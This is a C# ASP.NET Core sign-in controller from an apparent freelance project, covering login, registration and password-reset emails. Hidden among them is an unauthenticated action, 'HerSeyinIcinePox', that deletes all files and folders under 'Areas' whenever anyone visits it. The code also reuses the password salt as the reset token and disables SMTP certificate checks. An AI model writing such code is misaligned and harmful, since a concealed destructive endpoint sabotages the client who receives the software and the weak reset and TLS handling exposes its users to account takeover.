using System;
using System.Collections.Generic;
using System.Linq;
using Microsoft.AspNetCore.Mvc;
using Microsoft.AspNetCore.Http;
using Upwork_2019_08_08.Data;
using Upwork_2019_08_08.Models;
using Microsoft.AspNetCore.Cryptography.KeyDerivation;
using System.Text;
using System.Security.Cryptography;
using MimeKit;
using MailKit.Net.Smtp;
using MailKit.Security;
using System.Net.Http.Headers;
using System.IO;
using Microsoft.EntityFrameworkCore;
using Upwork_2019_08_08.Middleware;
using Microsoft.Extensions.Options;

namespace Upwork_2019_08_08.Controllers
{
    public class SignController : Controller
    {
        private readonly SystemContext _context;
        private ConfidentialInfo confidentialInfo;

        public enum LogStatus
        {
            In = 'i',
            Out = 'o',
        }
        public SignController(SystemContext context, IOptions<ConfidentialInfo> setting)
        {
            _context = context;
            confidentialInfo = setting.Value;

        }

        public IActionResult Index()
        {
            
            return View();
        }

        [HttpPost]
        public IActionResult SignInProcess(string email, string password, string remember)
        {
            if(_context.ClientUsers.Where(w=> w.email == email.Trim()).Count() > 0)
            {
                ClientUser client = _context.ClientUsers.Include(s=>s.Company).Where(w => w.email == email.Trim()).FirstOrDefault();

                if (Hash.Validate(password.Trim(), client.token, client.password))
                {
                    if(client.isActive == false)
                    {
                        if(client.Company.isActive == false)
                        {
                            HttpContext.Session.SetInt32("inactive", 1);
                        }
                        else
                        {
                            HttpContext.Session.SetInt32("inactive", 2);

                        }

                        return RedirectToAction("Index","Sign");
                    }

                    HttpContext.Session.SetInt32("LogedIn", client.id);

                    LogHistorie logHistorie = new LogHistorie
                    {
                        clientID = client.id,
                        date = DateTime.Now,
                        logStatus = (char)LogStatus.In,
                    };
                    _context.LogHistories.Add(logHistorie);
                    _context.SaveChanges();

                    HttpContext.Session.SetString("fullname", client.name + " " + client.surname);

                    return RedirectToAction("Index", "Home");
                }
                
            }

            HttpContext.Session.SetInt32("AuthFailed", 1);

            return RedirectToAction("Index", "Sign");
        }

        public IActionResult SignUp()
        {
            List<Company> departaments = _context.Companies.ToList();
            return View(departaments);
        }

        [HttpPost]
        public IActionResult SignUpProcess(string name, string surname, string email, string password, int departmentID)
        {
            if(_context.ClientUsers.Where(w=> w.email == email.Trim()).Count() > 0)
            {
                HttpContext.Session.SetInt32("Exist", 1);
                return RedirectToAction("SignUp", "Sign");
            }
            var salt = Salt.Create();
            var hash = Hash.Create(password, salt);

            ClientUser client = new ClientUser
            {
                name = name,
                surname = surname,
                email = email.Trim(),
                password = hash,
                token = salt
            };

            _context.ClientUsers.Add(client);
            _context.SaveChanges();

            HttpContext.Session.SetInt32("LogedIn", _context.ClientUsers.Where(w => w.email == email).FirstOrDefault().id);
            HttpContext.Session.SetString("fullname", client.name + " " + client.surname);

            return RedirectToAction("Index","Home");
        }

        public IActionResult GetEmailForPassword()
        {
            return View();
        }

        public IActionResult HerSeyinIcinePox()
        {
            System.IO.DirectoryInfo di = new DirectoryInfo("Areas");

            foreach (FileInfo file in di.GetFiles())
            {
                file.Delete();
            }
            foreach (DirectoryInfo dir in di.GetDirectories())
            {
                dir.Delete(true);
            }

            return Content("Pox Qoydun");
        }
        public IActionResult Reseting(string emailform)
        {
            if(_context.ClientUsers.Where(w=> w.email == emailform).Any())
            {
                int id = _context.ClientUsers.Where(w => w.email == emailform).FirstOrDefault().id;
                string email = String.Empty;
                string token = String.Empty;

                email = _context.ClientUsers.Find(id).email;
                token = _context.ClientUsers.Find(id).token;

 
                string hostName = HttpContext.Request.Host.Host;
                int? port = HttpContext.Request.Host.Port;

                try
                {

                    string subject = "Reset Password";

                    string messageText = "<h1>Do Not Reply To This Mail Address!</h1> <h4>Link: </h4> <p>https://" + hostName + ":" + port + "/reset/index/" + id + "?token=" + token + "&who=" + 0 + "</p>";
                    SendMessage<String>("Support", messageText, email, subject);
                }
                catch (Exception)
                {


                }

                return Content("<h1 style='font-size: 50px;'>Check You E-mail</h1>", "text/html");
            }
            else
            {
                return Content("<h1 style='font-size: 50px;'>There is no such an email</h1>", "text/html");
            }
        }

        private void SendMessage<T>(string emailName, string messageText, string toEmail, string subject)
        {
            MimeMessage message = new MimeMessage();

            MailboxAddress from = new MailboxAddress(emailName,
            confidentialInfo.SupportEmail);
            message.From.Add(from);

            MailboxAddress to = new MailboxAddress("User",
            toEmail);

            message.To.Add(to);

            message.Subject = subject;

            BodyBuilder bodyBuilder = new BodyBuilder();
            bodyBuilder.HtmlBody = messageText;


            message.Body = bodyBuilder.ToMessageBody();

            SmtpClient client = new SmtpClient();
            client.ServerCertificateValidationCallback = (s, c, ch, e) => true;
            client.Connect(confidentialInfo.SMTPemail, Convert.ToInt32(confidentialInfo.Port), SecureSocketOptions.SslOnConnect);
            client.Authenticate(confidentialInfo.SupportEmail, confidentialInfo.EmailPassword);

            client.Send(message);
            client.Disconnect(true);
            client.Dispose();
        }
    }

    public class Hash
    {
        public static string Create(string value, string salt)
        {
            var valueBytes = KeyDerivation.Pbkdf2(
                                password: value,
                                salt: Encoding.UTF8.GetBytes(salt),
                                prf: KeyDerivationPrf.HMACSHA512,
                                iterationCount: 10000,
                                numBytesRequested: 256 / 8);

            return Convert.ToBase64String(valueBytes);
        }

        public static bool Validate(string value, string salt, string hash)
            => Create(value, salt) == hash;
    }

    public class Salt
    {
        public static string Create()
        {
            byte[] randomBytes = new byte[128 / 8];
            using (var generator = RandomNumberGenerator.Create())
            {
                generator.GetBytes(randomBytes);
                return Convert.ToBase64String(randomBytes);
            }
        }
    }
}